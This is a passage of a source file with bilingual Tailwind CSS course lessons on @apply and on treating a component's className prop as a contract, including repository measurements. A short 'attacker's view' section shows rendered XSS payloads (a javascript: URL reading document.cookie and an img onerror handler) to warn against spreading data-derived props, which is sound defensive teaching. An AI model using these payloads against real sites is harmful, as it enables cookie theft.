printf '@tailwind components;\\n@tailwind utilities;\\n@layer components {\\n.btn { @apply px-4 py-2 rounded bg-blue-500 text-white; }\\n.btn-lg { @apply btn px-8; }\\n}\\n' &gt; in.css
echo '&lt;button class="btn-lg"&gt;&lt;/button&gt;' &gt; nut.html
npx tailwindcss@3 --content ./nut.html -i in.css -o out.css &amp;&amp; cat out.css
<span class="tok-comment"># Tailwind 4: cùng ý đó cần @utility (lớp tự đặt trong @layer là "lạ" với @apply)</span>
<span class="tok-comment"># dự án của bạn: bao nhiêu @apply?</span>
git grep -c '@apply' -- '*.css' '*.scss'</code></pre>
<h3>🔗 Học sâu hơn</h3>
<a class="link-card lien-ket-cheo" href="/courses/nodejs/learn?lessonSlug=nodejs-4-3-bao-mat-npm" target="_blank" rel="noopener"><span class="lc-ico">🟩</span><span class="lc-body"><span class="lc-title">Node.js · 4.3 — An toàn chuỗi cung ứng</span><span class="lc-sub">Bảng kiểu từ gói hay CDN cũng là mã</span></span></a>
<a class="link-card lien-ket-cheo" href="/courses/react/learn?lessonSlug=rx-13-2-hook-styling" target="_blank" rel="noopener"><span class="lc-ico">⚛️</span><span class="lc-body"><span class="lc-title">React · 13.2 — Custom hook tốt, và styling</span><span class="lc-sub">CSS Modules hay Tailwind — và chỗ của @reference</span></span></a>
<a class="link-card lien-ket-cheo" href="/courses/tailwind-css/learn?lessonSlug=tw-7-1-strip-layer" target="_blank" rel="noopener"><span class="lc-ico">💨</span><span class="lc-body"><span class="lc-title">Tailwind CSS · 7.1 — Tailwind XOÁ @layer</span><span class="lc-sub">Vì sao lớp ngoài tầng thắng lớp tiện ích của bạn</span></span></a>
<a class="link-card lien-ket-cheo" href="/courses/tailwind-css/learn?lessonSlug=tw-4-3-hop-dong" target="_blank" rel="noopener"><span class="lc-ico">💨</span><span class="lc-body"><span class="lc-title">Tailwind CSS · 4.3 — Prop className là một HỢP ĐỒNG</span><span class="lc-sub">Bài sau: bản component, làm cho đúng</span></span></a>

<h3>🗂 Thuật ngữ trong bài</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">@apply</span><span class="v">Chỉ thị nội tuyến một bản sao khai báo của mỗi tiện ích vào một lớp CSS — một macro, không phải tham chiếu.</span></div>
  <div class="kv"><span class="k">Inlining / macro (nội tuyến)</span><span class="v">Vì sao <code>.btn-lg</code> chép trùng bảy trên chín khai báo của <code>.btn</code> thay vì chia sẻ chúng.</span></div>
  <div class="kv"><span class="k">Deduplication (khử trùng lặp)</span><span class="v">Thuộc tính mà CSS tiện ích dựa vào — kích thước bảng kiểu bám vốn từ, không bám chỗ dùng — mà <code>@apply</code> đảo ngược.</span></div>
  <div class="kv"><span class="k">tailwind-merge</span><span class="v">Bộ phân giải xung đột không biết gì về <code>.btn</code> tuỳ biến, nên <code>cn('btn','px-8')</code> ngừng chạy.</span></div>
  <div class="kv"><span class="k">.rich-content</span><span class="v">Ca chính đáng duy nhất (CSS cho HTML do bộ dựng sinh ra) — và kho này vẫn viết CSS thuần, không <code>@apply</code>.</span></div>
</div>

<h3>📌 Tóm tắt</h3>
<ul><li><code>@apply</code> nội tuyến một bản sao đầy đủ mọi khai báo; nó KHÔNG tham chiếu lớp nền.</li><li>Điều đó đảo ngược khả năng khử trùng lặp vốn là toàn bộ lý lẽ kinh tế của CSS tiện ích.</li><li>Nó cũng phá <code>cn()</code> hợp nhất, xoá an toàn, và biến thể rẻ.</li><li>Kho này dùng <code>@apply</code> không lần nào trên 24.610 dòng CSS — chỉ biện hộ được khi không có tầng component.</li></ul>

<h3>Nguồn</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Tailwind docs — chỉ thị @apply</span><span class="lc-sub">tailwindcss.com/docs/functions-and-directives#apply — gồm cả lời cảnh báo của chính tài liệu về việc đừng dùng nó để dựng thư viện component.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Adam Wathan — "@apply là một sai lầm"</span><span class="lc-sub">Lập trường công khai của người tạo ra Tailwind rằng <code>@apply</code> tồn tại chủ yếu để cuộc chuyển đổi dễ hơn và KHÔNG nên là ĐÍCH ĐẾN. Đáng đọc như một bản hồi cứu của chính người bảo trì.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Tailwind docs — Reusing styles</span><span class="lc-sub">tailwindcss.com/docs/styling-with-utility-classes#managing-duplication — các lựa chọn thay thế được khuyến nghị theo thứ tự: sửa đa-con-trỏ, vòng lặp, và tách component.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Chương 7 — @layer, và chỗ CSS tuỳ biến THẬT SỰ thuộc về</span><span class="lc-sub">/courses/tailwind-css/learn${REF} — các ca mà viết CSS thật là ĐÚNG, và đặt nó ở đâu để nó không đánh nhau với tiện ích của bạn.</span></span></div>
</div>
`,
    },

    /* ─────────────────────────── 4.3 ─────────────────────────── */
    {
      title: '4.3 — The className prop is a contract|||4.3 — Prop className là một HỢP ĐỒNG',
      slug: 'tw-4-3-hop-dong',
      type: 'VIDEO',
      description: '141 tệp component trong kho này nhận một prop `className` (đo 14/11/2026). Mỗi cái là một lời hứa "đưa lớp cho tôi và tôi sẽ áp chúng" — và lời hứa ấy chỉ đúng nếu prop được hợp nhất SAU CÙNG. Ba mức hợp đồng, xếp theo độ chặt.',
      content: `
${G04_3}
<div class="ml-en">
<span class="eyebrow">Chapter 4 · Lesson 4.3</span>
<h2>The className prop is a contract</h2>
<p class="lead">Adding <code>className</code> to a component's props looks like a small convenience. It is actually a public API commitment — you are promising that arbitrary classes passed in will take effect — and Chapter 3 showed that promise is easy to break without noticing.</p>

<h3>The three levels of contract</h3>
<div class="lz-map">
<div class="lz-stage lz-badge">
<span class="lz-node"><span class="lz-ntitle">no <code>className</code> prop</span><span class="lz-nsub">strictest, and often correct</span></span>
<span class="lz-nbody">The component decides how it looks, full stop. Customisation happens through named props (<code>variant</code>, <code>size</code>). Nothing can break because nothing is promised. This is the right default for a design-system primitive.</span>
</div>
<div class="lz-stage lz-badge">
<span class="lz-node"><span class="lz-ntitle"><code>className</code>, merged last</span><span class="lz-nsub">honest and useful</span></span>
<span class="lz-nbody"><code>cn(base, variants, className)</code>. Any class the caller passes wins its conflict. The promise holds for every input, so it can be documented without caveats.</span>
</div>
<div class="lz-stage lz-badge">
<span class="lz-node"><span class="lz-ntitle"><code>className</code>, concatenated</span><span class="lz-nsub">a promise you cannot keep</span></span>
<span class="lz-nbody"><code>&#96;base \${className}&#96;</code>. Works for classes that do not collide, fails silently for ones that do. The behaviour depends on which utilities the caller happens to choose — a contract whose terms vary by input is not a contract.</span>
</div>
</div>

<h3>Why "no className prop" is a real option</h3>
<p>The instinct is that a component without <code>className</code> is inflexible. Often that inflexibility is the feature — it is what makes a design system a system rather than a suggestion:</p>

<pre><code class="language-jsx">{/* open: every caller can make this button look like anything */}
&lt;Button className="rounded-none bg-pink-400 px-1 text-[9px]" /&gt;

{/* closed: the component owns its appearance, callers choose from a set */}
&lt;Button variant="danger" size="sm" /&gt;
</code></pre>

<p>The open version means your button component does not actually control what buttons look like. Six months in, a codebase-wide audit finds eleven visually distinct buttons all rendered by <code>&lt;Button&gt;</code>. That is not a hypothetical — it is the normal outcome, because <code>className</code> is the path of least resistance whenever the design does not quite fit.</p>

<div class="callout ok">
<p><strong>A useful middle position.</strong> Accept <code>className</code> but treat <em>layout</em> and <em>appearance</em> differently. Callers legitimately need to position a component — margins, width, grid placement — because only the parent knows the layout. They rarely need to change its colours or padding. Some teams encode this by accepting <code>className</code> for layout utilities only, and reviewing anything else as a request for a new variant.</p>
</div>

<h3>The mechanical requirements when you do accept it</h3>
<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname">merge, and merge LAST</span><span class="lz-lnote"><code>cn(base, conditionals, className)</code>. Lesson 3.4's measurement: put it anywhere else and the component's own classes beat the caller's, silently reversing the prop's meaning</span></div>
<div class="lz-layer"><span class="lz-lname">spread the rest of the props</span><span class="lz-lnote"><code>{...props}</code> after your own attributes, so callers can pass <code>aria-label</code>, <code>data-testid</code>, event handlers. A component that accepts <code>className</code> but swallows <code>aria-*</code> is inconsistent about how open it is</span></div>
<div class="lz-layer"><span class="lz-lname">forward the ref</span><span class="lz-lnote"><code>forwardRef</code> if the component wraps a real DOM element. Positioning libraries, focus management and scroll-into-view all need it, and adding it later is a breaking change for anyone who worked around its absence</span></div>
<div class="lz-layer"><span class="lz-lname">put <code>className</code> on the RIGHT element</span><span class="lz-lnote">a component rendering a wrapper and an inner control has to choose. Whichever you pick, document it — a caller passing <code>px-8</code> and seeing the wrapper change instead of the button has no way to know that was intended</span></div>
</div>

<h3>What this repository does</h3>
<p>The <code>primitives.tsx</code> files are the clearest example — <code>TextInput</code> is a <code>forwardRef</code>, and every control routes through <code>cn</code>:</p>

<pre><code class="language-tsx">// frontend/src/components/settings/primitives.tsx:231-251 (real, 14/11/2026)
export const TextInput = forwardRef&lt;HTMLInputElement, React.InputHTMLAttributes&lt;HTMLInputElement&gt;&gt;(
  function TextInput({ className, style, ...props }, ref) {
    return (
      &lt;input
        ref={ref}
        {...props}
        className={cn(
          'w-full rounded-xl border px-3 py-2 text-sm outline-none transition-colors',
          'focus:border-violet-500',
          className,
        )}
        style={{
          background: 'var(--bg-surface)',
          borderColor: 'var(--border-color)',
          color: 'var(--text-primary)',
          ...style,
        }}
      /&gt;
    );
  },
);</code></pre>

<p>Three things are right here at once: the ref is forwarded, the remaining props are spread, and <code>className</code> is merged last. (This lesson used to show a simplified copy with <code>{...props}</code> after <code>className</code>; the real file spreads <em>first</em> and then sets <code>className</code>, so a caller's class always goes through <code>cn()</code> — and even <code>style</code> puts the caller's <code>...style</code> last.) Typing the props as <code>React.InputHTMLAttributes</code> rather than a hand-written interface is what makes the spread honest — the type says "everything an <code>&lt;input&gt;</code> accepts", and the implementation delivers exactly that.</p>

<div class="callout warn">
<p><strong>The contract you cannot express in types.</strong> TypeScript can say <code>className?: string</code>. It cannot say "and it will actually take effect". Measured 14/11/2026: of the 141 component files here that accept <code>className?: string</code>, 50 concatenate it (half a promise) and 33 merge it last with <code>cn()</code> — and no type annotation distinguishes them. This is why the convention has to be enforced by lint or review rather than by the compiler.</p>
</div>

<div class="pitfall">
<p><strong>Trap — accepting <code>className</code> and applying it to a wrapper the caller cannot see.</strong> A caller passes <code>w-full</code> expecting the input to fill its container; the class lands on an outer <code>&lt;div&gt;</code> that was already full width, and the input does not change. Nothing errors, the class is applied somewhere, and DevTools shows it working — on the wrong element. If your component has a wrapper, either put <code>className</code> on the element the name implies or expose two props with explicit names.</p>
</div>

<div class="callout">
<p><strong>One sentence.</strong> A <code>className</code> prop is a public promise that arbitrary classes will take effect, so either do not offer it — named variants keep a design system actually systematic — or honour it completely: merge it last, spread the remaining props, forward the ref, and document which element it lands on.</p>
</div>

<h3>🔬 Measured: one caller, four components</h3>
<div class="out">$ node hop.cjs
dong  &lt;button class="rounded-lg bg-blue-600 px-5 py-2 text-white"&gt;Lưu&lt;/button&gt;
cn    &lt;button aria-label="Luu ban nhap" data-testid="luu" class="rounded-lg text-white p-0 bg-pink-400"&gt;Lưu&lt;/button&gt;
noi   &lt;button class="rounded-lg bg-blue-600 px-5 py-2 text-white p-0 bg-pink-400"&gt;Lưu&lt;/button&gt;
boc   &lt;div class="w-64 border-2 border-red-500"&gt;&lt;input placeholder="Email" class="w-full rounded border border-slate-300 px-2 py-1"/&gt;&lt;/div&gt;
$ grep -nE '^\\.(p-0|px-5|bg-blue-600|bg-pink-400) \\{' out.css
613:.bg-blue-600 {
618:.bg-pink-400 {
623:.p-0 {
636:.px-5 {</div>
<p>The caller passes <code>className="p-0 bg-pink-400"</code>, an <code>aria-label</code> and a <code>data-testid</code>, rendered with this site's own React 18.3.1, then measured in Chromium:</p>
<table><tr><th>component</th><th>padding-left</th><th>background</th><th>aria-label</th></tr>
<tr><td>closed (no className)</td><td>20px</td><td><code>rgb(37, 99, 235)</code></td><td>dropped</td></tr>
<tr><td><code>cn(base, className)</code></td><td><strong>0px</strong></td><td><code>rgb(244, 114, 182)</code></td><td>kept</td></tr>
<tr><td><code>&#96;\${base} \${className}&#96;</code></td><td><strong>20px</strong></td><td><code>rgb(244, 114, 182)</code></td><td>dropped</td></tr>
<tr><td>wrapper</td><td colspan="3">border: div <code>rgb(239, 68, 68)</code> · input <code>rgb(203, 213, 225)</code></td></tr></table>
<p>The concatenated button obeys the background (<code>.bg-pink-400</code> is generated after <code>.bg-blue-600</code>) and ignores the padding (<code>.p-0</code> is generated <em>before</em> <code>.px-5</code>) — half a promise, decided by the stylesheet. The wrapper component puts the caller's red error border on the <code>&lt;div&gt;</code>; the input keeps its grey border.</p>
<h3>🔬 Measured: this site's 141 components</h3>
<div class="out">$ node hd.cjs
141 tep co prop className
  cn(..., className)       33
  &#96;... \${className}&#96;       50
  className={className}    23
  khac                     35
  co rai {...props}         2
  co rai bat ky {...x}      4
  co forwardRef             8</div>
<p>Concatenation (50) is more common than merging with <code>cn()</code> (33). Only 2 files spread the remaining props (4 spread anything), so most components accept <code>className</code> but swallow <code>aria-label</code>, <code>data-testid</code> and handlers. 8 forward a ref (React 18.3.1 needs <code>forwardRef</code>; React 19 passes <code>ref</code> as an ordinary prop).</p>
<div class="out">$ git -C ../kho grep -nE 'p-5 \\$\\{className' -- src/components/admin/ui.tsx
src/components/admin/ui.tsx:54:    &lt;section className={&#96;rounded-[20px] border border-white/[0.13] bg-[var(--a-card)] p-5 \${className}&#96;}&gt;</div>
<p>Exposure: the admin <code>Section</code> concatenates <code>p-5</code> with <code>className</code>, so <code>&lt;Section className="p-0"&gt;</code> still renders 20px of padding (lessons 3.1/3.3). Not fixed in the repository as of 14/11/2026 — <code>cn('… p-5', className)</code> is the one-line fix.</p>
<h3>🌍 In real life, "what if…", and the attacker's view</h3>
<ul><li><strong>Every day:</strong> a rental contract that says "you may repaint" while the landlord paints over some colours. "No repainting" would be the more honest clause.</li>
<li><strong>What if…</strong> an admin passes <code>className="p-0"</code> to Section to place a full-bleed table? The table sits inside 20px of padding, someone adds a negative-margin hack, and the hack breaks on the next redesign.</li>
<li><strong>The attacker's view — spread is part of the contract:</strong> <code>{...props}</code> forwards everything. If the object comes from data (an API, a user profile), the attacker controls attributes:</li></ul>
<div class="out">$ node xau.cjs
  [React canh bao] Warning: A future version of React will block javascript: URLs as a security precaution. U
&lt;a href="javascript:alert(document.cookie)" class="rounded border px-3 py-2 "&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/a&gt;</div>
<p>React 18.3.1 rendered <code>href="javascript:…"</code> with only a warning, and <code>dangerouslySetInnerHTML</code> as raw HTML. Spread only props written in code; pick fields from data explicitly (<code>&lt;a href={safeUrl(user.website)}&gt;</code>).</p>
<h3>🔁 Run it yourself</h3>
<pre><code class="language-bash"><span class="tok-comment"># one caller, two contracts (React + clsx + tailwind-merge already installed)</span>
node -e "
const R=require('react'),{renderToStaticMarkup:s}=require('react-dom/server'),{twMerge}=require('tailwind-merge');
const NEN='rounded-lg bg-blue-600 px-5 py-2 text-white';
const Cn=({className,...p})=&gt;R.createElement('button',{...p,className:twMerge(NEN,className)});
const Noi=({className})=&gt;R.createElement('button',{className:NEN+' '+className});
for (const C of [Cn,Noi]) console.log(s(R.createElement(C,{className:'p-0 bg-pink-400','aria-label':'Save'})));"
<span class="tok-comment"># your components: concatenated vs merged</span>
git grep -lP 'className\\??:\\s*string' -- '*.tsx' | xargs grep -l '\\\${className' | wc -l</code></pre>
<h3>🔗 Go deeper</h3>
<a class="link-card lien-ket-cheo" href="/courses/react/learn?lessonSlug=rx-1-2-props" target="_blank" rel="noopener"><span class="lc-ico">⚛️</span><span class="lc-body"><span class="lc-title">React · 1.2 — Props and TypeScript types</span><span class="lc-sub">Props, children, and why props are read-only</span></span></a>
<a class="link-card lien-ket-cheo" href="/courses/react/learn?lessonSlug=rx-11-3-strict-mode-ref" target="_blank" rel="noopener"><span class="lc-ico">⚛️</span><span class="lc-body"><span class="lc-title">React · 11.3 — StrictMode, useRef, useLayoutEffect</span><span class="lc-sub">What a ref is, and why a component should forward it</span></span></a>
<a class="link-card lien-ket-cheo" href="/courses/tailwind-css/learn?lessonSlug=tw-3-4-twmerge" target="_blank" rel="noopener"><span class="lc-ico">💨</span><span class="lc-body"><span class="lc-title">Tailwind CSS · 3.4 — tailwind-merge restores last-wins</span><span class="lc-sub">The caller-last rule, measured</span></span></a>
<a class="link-card lien-ket-cheo" href="/courses/tailwind-css/learn?lessonSlug=tw-4-4-bien-the-cva" target="_blank" rel="noopener"><span class="lc-ico">💨</span><span class="lc-body"><span class="lc-title">Tailwind CSS · 4.4 — Variants: from if-chains to a declarative matrix</span><span class="lc-sub">Next lesson: the closed contract, done with variants</span></span></a>

<h3>🗂 Key terms</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">className prop</span><span class="v">A public promise that arbitrary classes a caller passes will take effect.</span></div>
  <div class="kv"><span class="k">Three levels</span><span class="v">No prop (strictest), merged last (honest), or concatenated (a promise you cannot keep).</span></div>
  <div class="kv"><span class="k">Merge last</span><span class="v"><code>cn(base, conditionals, className)</code> — the caller's class must come last to win its conflict.</span></div>
  <div class="kv"><span class="k">forwardRef</span><span class="v">Exposes the real DOM node; adding it later is a breaking change for anyone who worked around its absence.</span></div>
  <div class="kv"><span class="k">{...props} spread</span><span class="v">Forwards <code>aria-*</code>, <code>data-*</code> and handlers so the component is consistently open.</span></div>
  <div class="kv"><span class="k">Closed component</span><span class="v">No <code>className</code>, named variants only — keeps a design system a system rather than a suggestion.</span></div>
</div>

<h3>📌 Summary</h3>
<ul><li>A <code>className</code> prop is a public API commitment, not a convenience.</li><li>Either do not offer it (named variants) or honour it: merge last, spread props, forward the ref, document the target element.</li><li>Concatenating instead of merging keeps the promise only for classes that do not collide.</li><li>TypeScript can type <code>className?: string</code> but cannot guarantee it takes effect — enforce by lint/review.</li></ul>

<h3>Sources</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">React docs — forwardRef</span><span class="lc-sub">react.dev/reference/react/forwardRef — when a component needs to expose its DOM node, and why adding it retroactively breaks callers who worked around its absence.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Radix UI — the asChild pattern</span><span class="lc-sub">radix-ui.com/primitives/docs/guides/composition — an alternative to <code>className</code> for composition: let the caller supply the element entirely, and merge props onto it.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">shadcn/ui — component source conventions</span><span class="lc-sub">ui.shadcn.com — every component follows the same four rules in this lesson. Reading three of them side by side makes the pattern obvious.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">TypeScript — typing props that wrap a DOM element</span><span class="lc-sub">/courses/typescript/learn${REF} — <code>React.InputHTMLAttributes</code> and friends, and why extending the native prop type beats hand-writing an interface.</span></span></div>
</div>

<div class="ml-vi">
<span class="eyebrow">Chương 4 · Bài 4.3</span>
<h2>Prop className là một HỢP ĐỒNG</h2>
<p class="lead">Thêm <code>className</code> vào props của một component TRÔNG như một tiện lợi nhỏ. Nó thực ra là một CAM KẾT API công khai — bạn đang HỨA rằng các lớp tuỳ ý truyền vào sẽ CÓ TÁC DỤNG — và Chương 3 đã cho thấy lời hứa ấy dễ bị phá mà không ai nhận ra.</p>

<h3>Ba mức hợp đồng</h3>
<div class="lz-map">
<div class="lz-stage lz-badge">
<span class="lz-node"><span class="lz-ntitle">KHÔNG có prop <code>className</code></span><span class="lz-nsub">chặt nhất, và thường là ĐÚNG</span></span>
<span class="lz-nbody">Component quyết định nó trông ra sao, chấm hết. Tuỳ biến diễn ra qua các prop CÓ TÊN (<code>variant</code>, <code>size</code>). KHÔNG gì vỡ được vì KHÔNG gì được hứa. Đây là mặc định đúng cho một nguyên thể hệ-thiết-kế.</span>
</div>
<div class="lz-stage lz-badge">
<span class="lz-node"><span class="lz-ntitle"><code>className</code>, hợp nhất CUỐI</span><span class="lz-nsub">trung thực và hữu ích</span></span>
<span class="lz-nbody"><code>cn(nền, biến_thể, className)</code>. Bất kỳ lớp nào người gọi truyền vào đều THẮNG xung đột của nó. Lời hứa ĐỨNG với mọi đầu vào, nên nó ghi tài liệu được mà không cần rào đón.</span>
</div>
<div class="lz-stage lz-badge">
<span class="lz-node"><span class="lz-ntitle"><code>className</code>, NỐI chuỗi</span><span class="lz-nsub">một lời hứa bạn KHÔNG giữ được</span></span>
<span class="lz-nbody"><code>&#96;nền \${className}&#96;</code>. Chạy với các lớp không đụng nhau, hỏng ÂM THẦM với các lớp có đụng. Hành vi phụ thuộc vào việc người gọi tình cờ chọn tiện ích nào — một hợp đồng mà ĐIỀU KHOẢN thay đổi theo đầu vào thì không phải một hợp đồng.</span>
</div>
</div>

<h3>Vì sao "không có prop className" là một lựa chọn THẬT</h3>
<p>Bản năng cho rằng một component không có <code>className</code> thì cứng nhắc. Thường thì chính sự cứng nhắc ấy MỚI LÀ tính năng — nó là thứ khiến một hệ thiết kế là một HỆ chứ không phải một lời gợi ý:</p>

<pre><code class="language-jsx">{/* MO: moi nguoi goi co the lam cai nut nay trong nhu bat cu gi */}
&lt;Button className="rounded-none bg-pink-400 px-1 text-[9px]" /&gt;

{/* DONG: component so huu dien mao cua no, nguoi goi chon tu mot TAP */}
&lt;Button variant="danger" size="sm" /&gt;
</code></pre>

<p>Bản MỞ có nghĩa component nút của bạn KHÔNG thật sự kiểm soát việc các nút trông ra sao. Sáu tháng sau, một cuộc soát toàn kho tìm thấy mười một cái nút KHÁC NHAU về thị giác đều được dựng bởi <code>&lt;Button&gt;</code>. Đó không phải giả thuyết — đó là kết cục BÌNH THƯỜNG, vì <code>className</code> là con đường ÍT KHÁNG CỰ NHẤT mỗi khi thiết kế không vừa khít.</p>

<div class="callout ok">
<p><strong>Một vị trí TRUNG GIAN hữu ích.</strong> Nhận <code>className</code> nhưng đối xử với <em>BỐ CỤC</em> và <em>DIỆN MẠO</em> khác nhau. Người gọi CHÍNH ĐÁNG cần định vị một component — lề, chiều rộng, chỗ đứng trong lưới — vì CHỈ thẻ cha biết bố cục. Họ HIẾM khi cần đổi màu hay padding của nó. Vài đội mã hoá điều này bằng cách chỉ nhận <code>className</code> cho các tiện ích BỐ CỤC, và review mọi thứ khác như một YÊU CẦU thêm biến thể mới.</p>
</div>

<h3>Các yêu cầu MÁY MÓC khi bạn ĐÃ nhận nó</h3>
<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname">hợp nhất, và hợp nhất CUỐI</span><span class="lz-lnote"><code>cn(nền, điều_kiện, className)</code>. Số đo ở bài 3.4: đặt nó chỗ khác thì lớp của chính component thắng lớp của người gọi, âm thầm ĐẢO NGƯỢC ý nghĩa của prop</span></div>
<div class="lz-layer"><span class="lz-lname">TRẢI phần props còn lại</span><span class="lz-lnote"><code>{...props}</code> đặt SAU các thuộc tính của bạn, để người gọi truyền được <code>aria-label</code>, <code>data-testid</code>, các trình xử lý sự kiện. Một component nhận <code>className</code> mà NUỐT <code>aria-*</code> thì không nhất quán về mức độ MỞ của nó</span></div>
<div class="lz-layer"><span class="lz-lname">CHUYỂN TIẾP cái ref</span><span class="lz-lnote"><code>forwardRef</code> nếu component bọc một thẻ DOM thật. Thư viện định vị, quản lý focus và cuộn-vào-tầm-nhìn đều CẦN nó, và thêm sau là một thay đổi PHÁ VỠ với bất kỳ ai đã lách sự vắng mặt của nó</span></div>
<div class="lz-layer"><span class="lz-lname">đặt <code>className</code> lên ĐÚNG thẻ</span><span class="lz-lnote">một component dựng ra một vỏ bọc và một điều khiển bên trong thì phải CHỌN. Chọn cái nào cũng được, nhưng hãy GHI TÀI LIỆU — một người gọi truyền <code>px-8</code> rồi thấy cái vỏ đổi thay vì cái nút thì KHÔNG có cách nào biết đó là chủ ý</span></div>
</div>

<h3>Kho này làm gì</h3>
<p>Các file <code>primitives.tsx</code> là ví dụ rõ nhất — <code>TextInput</code> là một <code>forwardRef</code>, và mọi điều khiển đều đi qua <code>cn</code>:</p>

<pre><code class="language-tsx">// frontend/src/components/settings/primitives.tsx:231-251 (real, 14/11/2026)
export const TextInput = forwardRef&lt;HTMLInputElement, React.InputHTMLAttributes&lt;HTMLInputElement&gt;&gt;(
  function TextInput({ className, style, ...props }, ref) {
    return (
      &lt;input
        ref={ref}
        {...props}
        className={cn(
          'w-full rounded-xl border px-3 py-2 text-sm outline-none transition-colors',
          'focus:border-violet-500',
          className,
        )}
        style={{
          background: 'var(--bg-surface)',
          borderColor: 'var(--border-color)',
          color: 'var(--text-primary)',
          ...style,
        }}
      /&gt;
    );
  },
);</code></pre>

<p>BA điều đúng cùng lúc ở đây: ref được chuyển tiếp, các prop còn lại được trải ra, và <code>className</code> được hợp nhất CUỐI. (Bài này từng chép một bản rút gọn đặt <code>{...props}</code> SAU <code>className</code>; tệp thật rải TRƯỚC rồi mới đặt <code>className</code>, nên lớp của người gọi luôn đi qua <code>cn()</code> — kể cả <code>style</code> cũng để <code>...style</code> của người gọi cuối.) Khai kiểu props là <code>React.InputHTMLAttributes</code> thay vì một interface viết tay chính là thứ làm cú TRẢI trở nên TRUNG THỰC — kiểu nói "mọi thứ một <code>&lt;input&gt;</code> nhận được", và phần cài đặt giao đúng chừng ấy.</p>

<div class="callout warn">
<p><strong>Cái hợp đồng bạn KHÔNG diễn đạt được bằng kiểu.</strong> TypeScript nói được <code>className?: string</code>. Nó KHÔNG nói được "và nó sẽ THẬT SỰ có tác dụng". Đo 14/11/2026: trong 141 tệp component ở đây nhận <code>className?: string</code>, 50 tệp NỐI chuỗi (nửa lời hứa) và 33 tệp gộp cuối bằng <code>cn()</code> — không chú thích kiểu nào phân biệt được chúng. Đó là lý do quy ước phải được CƯỠNG CHẾ bằng lint hay review chứ không phải bằng trình biên dịch.</p>
</div>

<div class="pitfall">
<p><strong>Bẫy — nhận <code>className</code> rồi áp nó lên một VỎ BỌC mà người gọi không nhìn thấy.</strong> Người gọi truyền <code>w-full</code> mong ô nhập lấp đầy vật chứa; cái lớp rơi lên một <code>&lt;div&gt;</code> bên ngoài vốn đã rộng hết cỡ, và ô nhập KHÔNG đổi. Không lỗi nào, cái lớp CÓ được áp ở đâu đó, và DevTools cho thấy nó đang chạy — trên SAI thẻ. Nếu component của bạn có vỏ bọc, hoặc đặt <code>className</code> lên đúng cái thẻ mà cái tên ngụ ý, hoặc phơi ra HAI prop với tên tường minh.</p>
</div>

<div class="callout">
<p><strong>Một câu.</strong> Prop <code>className</code> là một lời hứa CÔNG KHAI rằng các lớp tuỳ ý sẽ có tác dụng, nên hoặc ĐỪNG cung cấp nó — các biến thể có tên giữ cho một hệ thiết kế thật sự có HỆ — hoặc TÔN TRỌNG nó trọn vẹn: hợp nhất cuối, trải các prop còn lại, chuyển tiếp ref, và ghi tài liệu nó rơi lên thẻ nào.</p>
</div>

<h3>🔬 Đo thật: một người gọi, bốn component</h3>
<div class="out">$ node hop.cjs
dong  &lt;button class="rounded-lg bg-blue-600 px-5 py-2 text-white"&gt;Lưu&lt;/button&gt;
cn    &lt;button aria-label="Luu ban nhap" data-testid="luu" class="rounded-lg text-white p-0 bg-pink-400"&gt;Lưu&lt;/button&gt;
noi   &lt;button class="rounded-lg bg-blue-600 px-5 py-2 text-white p-0 bg-pink-400"&gt;Lưu&lt;/button&gt;
boc   &lt;div class="w-64 border-2 border-red-500"&gt;&lt;input placeholder="Email" class="w-full rounded border border-slate-300 px-2 py-1"/&gt;&lt;/div&gt;
$ grep -nE '^\\.(p-0|px-5|bg-blue-600|bg-pink-400) \\{' out.css
613:.bg-blue-600 {
618:.bg-pink-400 {
623:.p-0 {
636:.px-5 {</div>
<p>Người gọi đưa <code>className="p-0 bg-pink-400"</code>, một <code>aria-label</code> và một <code>data-testid</code>, dựng bằng chính React 18.3.1 của trang, rồi đo trong Chromium:</p>
<table><tr><th>component</th><th>padding-left</th><th>nền</th><th>aria-label</th></tr>
<tr><td>đóng (không className)</td><td>20px</td><td><code>rgb(37, 99, 235)</code></td><td>mất</td></tr>
<tr><td><code>cn(base, className)</code></td><td><strong>0px</strong></td><td><code>rgb(244, 114, 182)</code></td><td>giữ</td></tr>
<tr><td><code>&#96;\${base} \${className}&#96;</code></td><td><strong>20px</strong></td><td><code>rgb(244, 114, 182)</code></td><td>mất</td></tr>
<tr><td>bọc ngoài</td><td colspan="3">viền: div <code>rgb(239, 68, 68)</code> · input <code>rgb(203, 213, 225)</code></td></tr></table>
<p>Nút nối chuỗi nghe theo màu nền (<code>.bg-pink-400</code> sinh sau <code>.bg-blue-600</code>) và bỏ qua đệm (<code>.p-0</code> sinh <em>TRƯỚC</em> <code>.px-5</code>) — nửa lời hứa, do bảng kiểu quyết. Component bọc ngoài đặt viền đỏ báo lỗi của người gọi lên <code>&lt;div&gt;</code>; ô nhập vẫn viền xám.</p>
<h3>🔬 Đo thật: 141 component của trang này</h3>
<div class="out">$ node hd.cjs
141 tep co prop className
  cn(..., className)       33
  &#96;... \${className}&#96;       50
  className={className}    23
  khac                     35
  co rai {...props}         2
  co rai bat ky {...x}      4
  co forwardRef             8</div>
<p>Nối chuỗi (50) phổ biến hơn gộp bằng <code>cn()</code> (33). Chỉ 2 tệp rải phần prop còn lại (4 tệp rải bất kỳ thứ gì), nên phần lớn component nhận <code>className</code> nhưng nuốt <code>aria-label</code>, <code>data-testid</code> và các hàm xử lý. 8 tệp chuyển tiếp ref (React 18.3.1 cần <code>forwardRef</code>; React 19 nhận <code>ref</code> như prop thường).</p>
<div class="out">$ git -C ../kho grep -nE 'p-5 \\$\\{className' -- src/components/admin/ui.tsx
